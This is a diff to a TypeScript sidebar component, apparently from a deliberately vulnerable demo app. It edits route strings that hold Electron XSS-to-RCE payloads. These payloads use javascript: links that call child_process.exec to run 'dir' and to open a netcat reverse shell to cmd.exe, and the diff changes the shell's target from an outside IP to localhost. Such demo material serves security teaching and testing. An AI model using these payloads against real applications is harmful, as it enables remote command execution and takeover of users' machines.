@@ -24,7 +24,7 @@ export class AppSidebarComponent {
     }/<a href='javascript:require(%22child_process%22).exec(%22dir%22, function (e,r) { alert(r)})'>Electron RCE - dir`;
     ROUTE_BREADCRUMBS_RCE_ELECTRON_SHELL: string = `${AppRoutes.XSS}/${
         XssRoutes.ELECTRON
-    }/<a href='javascript:require("child_process").exec("nc.exe 172.25.85.72 11235 -e cmd.exe", function (e,r) { alert(r)})'>Electron Shell - shell`;
+    }/<a href='javascript:require("child_process").exec("ncat 127.0.0.1 11235 -e cmd.exe", function (e,r) { alert(r)})'>Electron Shell - shell`;
 
     /**
      * markdown routes
